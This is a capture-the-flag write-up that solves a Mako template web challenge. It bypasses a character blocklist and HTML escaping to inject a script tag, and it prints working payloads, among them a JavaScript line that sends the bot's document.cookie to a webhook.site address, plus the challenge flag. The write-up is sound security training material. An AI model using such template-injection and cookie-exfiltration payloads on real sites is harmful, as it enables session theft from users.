It uses Mako for templating. Goal is to get the bot's cookie, but we have a couple of filters in place.

These characters are filtered for SSTI gadgets.
```
banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "import", "eval", "exec", "os", ";", ",", "|"]
```
HTML escaping
```
def escape_html(text):
    """Escapes HTML special characters in the given text."""
    # return text
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("(", "&#40;").replace(")", "&#41;")
```
From the filter you can see it doesn't actually block `${}` characters which we can use for python execution.

Because `banned` is passed like this, it is present during render and we can use it to bypass `escape_html` for XSS. Letters in the outer `banned` can also be bypassed with uppercase.
```
 return template.render(name_to_display=name_to_display, banned="&<>()")
```
Host a JS file.
```js
fetch('https://webhook.site/ba988073-9a21-4192-8d72-b1f3a5e6b143/'+document.cookie)
```
Payload:
```
${banned[1]+'SCript SRc=http://webhook%2eSite/ba988073-9a21-4192-8d72-b1f3a5e6b143'+ banned[2] + banned[1] + '/SCript' + banned[2]}
```

Flag: `TFCCTF{769d12568fc45f14056cbabec2421548a839fa464786dc2013b2453dab9c3cbe}`

Solved by: benkyou